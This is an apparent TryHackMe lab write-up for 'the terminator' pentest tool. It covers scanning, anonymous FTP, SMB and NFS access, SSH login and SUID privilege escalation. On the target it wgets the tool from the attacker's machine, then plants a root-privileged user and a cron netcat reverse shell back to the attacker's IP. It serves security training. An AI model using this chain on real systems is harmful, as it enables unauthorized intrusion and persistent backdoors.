![terminator-logo](https://github.com/suffs811/writeups/blob/main/terminator-img/small-terminator.png?raw=true)
# the terminator room writeup

>the terminator TryHackMe room: https://tryhackme.com/room/theterminator

>learn more about the terminator tool [here](https://github.com/suffs811/the-terminator) 

# preparation
first, open up a new shell on either your own machine or the TryHackMe attack box

then, download the terminator:
- if you are on your own machine, you can either clone the github repo or click on the blue *task files* button at the top right of the tryhackme page
- if you are using the tryhackme attack box, run `got clone https://github.com/suffs811/the-terminator.git` in your terminal

now let's terminate the target!

![IMG-1](https://github.com/suffs811/writeups/blob/main/terminator-img/1.png)

# enumeration 
to run the terminator's enumeration module, move into "the-terminator" directory and run the following:

`python3 terminator.py enum -t <target_ip>`

^^ of course, replace <target_ip> with the target machine's IP

![IMG-2](https://github.com/suffs811/writeups/blob/main/terminator-img/2.png)

now let's wait for the terminator to conduct port and service scans

the terminator identified the following as important findings:
- /hidden/
- possible username: alice
- anonymous ftp login allowed
- 'alicesmb' smb share
- '/nfs' NFS share

![IMG-3](https://github.com/suffs811/writeups/blob/main/terminator-img/3.png)

![IMG-4](https://github.com/suffs811/writeups/blob/main/terminator-img/4.png)

> you can answer all of the questions using the terminator's 'important findings'

# exploitation
let's take a look at these services to see if we can find any possible exploitation vector

### web
![IMG-5](https://github.com/suffs811/writeups/blob/main/terminator-img/5.png)
![IMG-6](https://github.com/suffs811/writeups/blob/main/terminator-img/6.png)
![IMG-7](https://github.com/suffs811/writeups/blob/main/terminator-img/7.png)

username: alice

## ftp
let's see what ftp has hiding.

`ftp <target_ip>` then input username `anonymous` and no password (just click enter).

to download the file, run `get note`, exit out of ftp and cat the 'note' file

password: p-----------1

![IMG-8](https://github.com/suffs811/writeups/blob/main/terminator-img/8.png)

## smb
let's look around the smb share and see if anything interesting is there.

`smbclient //<target_ip>/alicesmb -U alice`

use `more` to read the files. nothing too interesting, although the note about running utilities in an altered environment may be useful later

![IMG-9](https://github.com/suffs811/writeups/blob/main/terminator-img/9.png)

## nfs
let's mount the shared remote directory to a directory we make on our local machine.

`mkdir /mynfs`

`mount <target_ip>:/nfs /mynfs`

change into the /mynfs directory and read the file, looks like we can use ssh with our newly found credentials!

![IMG-10](https://github.com/suffs811/writeups/blob/main/terminator-img/10.png)

## ssh

`ssh alice@<target_ip>`

enter 'yes' and input alice's password.

we're in. now get the user flag.

![MEME-1](https://media.tenor.com/lIMtjiAYuT8AAAAM/breezy-hacker.gif)

![IMG-11](https://github.com/suffs811/writeups/blob/main/terminator-img/11.png)

# privilege escalation
before we escalate privileges, we first need to get 'the terminator' onto the target machine. there are many ways to do this:
- host a python web server and 'wget' the file
- scp the file to the remote box
- copy pasta the terminator's source code into a new file on the target box

let's make a python web to get the file over.

on your local machine, open a new terminal tab and go to 'the-terminator' directory where terminator.py is. then run the following to start a python web server:

`python3 -m http.server 8080`

![IMG-12](https://github.com/suffs811/writeups/blob/main/terminator-img/12.png)

on the target box, as user alice, run the following:

`wget http://<your_ip>:8080/terminator.py`

*your ip can be found by running `ip a` in your terminal or looking at the top right of the tryhackme attack box screen*

![IMG-13](https://github.com/suffs811/writeups/blob/main/terminator-img/13.png)

now, still on the target box,  run the terminator's privilege escalation module by going to 'the-terminator' directory and running:

`python3 terminator.py priv -u <new_user> -p <new_passwd>`

*the new_user and new_passwd are the new username and password you want to add to the target system in case the password files are writable*

![IMG-14](https://github.com/suffs811/writeups/blob/main/terminator-img/14.png)

>the answer to 'What SUID binary was the terminator able to use to gain escalated privileges?' can be found on the last printed line after gaining escalated privileges

![IMG-15](https://github.com/suffs811/writeups/blob/main/terminator-img/15.png)

**NOTE: you now have escalated priviliges but not a full root shell (if you run 'id' you will see your UID is still alice). look around the system* to find anything that could be exploited to gain a root shell (see /root)**

get that root flag!

![IMG-16](https://github.com/suffs811/writeups/blob/main/terminator-img/16.png)

# persistence/data exfiltration
now that we have the root password, let's login to root:
`su root` and enter the root password

now we can successfully run the terminator's persistence/data exfil module.

**if you are using the tryhackme attack box, you will need to set up a password for your local root user before running the privesc/data exfil module, so just run
`passwd` on your local box to make a new password**

go to 'the-terminator' directory (/home/alice) and run:

`python3 terminator.py root -u <new_user> -p <new_passwd> -l <your_ip> -x <any_port>`

*again, the new_user and new_passwd are for creating a new root-privileged user; the your_ip and any_port are for creating a netcat reverse shell callback*

![IMG-17](https://github.com/suffs811/writeups/blob/main/terminator-img/17.png)

the terminator will prompt you for your local username and password. if you are using the tryhackme attack box, your user should be 'root' and password is the password your just created for root.

![IMG-18](https://github.com/suffs811/writeups/blob/main/terminator-img/18.png)

success! we have established persistence by creating a new root-privileged user and creating a reverse shell callback that will send us a root shell every 5 minutes

![IMG-19](https://github.com/suffs811/writeups/blob/main/terminator-img/19.png)

if you want to catch the reverse shell, on your local box type:

`nc -nlvp <port>` the same port your used when you ran the terminator just now (-x <any_port>)

*if cronjob is not working, you might need to run 'crontab -e' then just add a space under the cronjob, and exit the file with 'Ctrl+x', 'y', 'enter'*

# report
now that we have terminated the target machine, we can create a report for our client

on your local box, go to 'the-terminator' directory and run:

`python3 terminator.py report -o <report_name>`

![IMG-20](https://github.com/suffs811/writeups/blob/main/terminator-img/20.png)

*if you get the following error, you may need to download the 'python-docx' library or specify the version of python you want to use*

![IMG-21](https://github.com/suffs811/writeups/blob/main/terminator-img/21.png)

to download 'python-docx':

`pip install python-docx` or `python3 -m pip install python-docx`

running the terminator again, we get no errors:

`python3.9 terminator.py report -o <report_name>`

![IMG-22](https://github.com/suffs811/writeups/blob/main/terminator-img/22.png)

# conclusion

and that's it! you just went through the penetration testing cycle from boot to root to report using the terminator.

to learn more about how the terminator works, check out the GitHub [here](https://github.com/suffs811/the-terminator)


thanks for using the terminator, happy hacking!

